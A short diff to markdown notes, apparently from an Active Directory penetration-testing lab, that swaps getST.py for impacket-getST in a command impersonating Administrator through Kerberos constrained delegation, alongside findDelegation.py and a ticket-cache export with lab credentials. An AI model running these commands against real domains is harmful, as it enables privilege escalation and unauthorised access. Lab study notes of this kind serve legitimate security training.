@@ -129,7 +129,7 @@ Enter-PSSession ws01.inlanefreight.local
 findDelegation.py INLANEFREIGHT.LOCAL/carole.rose:jasmine
 ```
 ```bash
-getST.py -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' -impersonate Administrator
+impacket-getST -spn TERMSRV/DC01 'INLANEFREIGHT.LOCAL/beth.richards:B3thR!ch@rd$' -impersonate Administrator
 ```
 ```bash
 export KRB5CCNAME=./Administrator.ccache
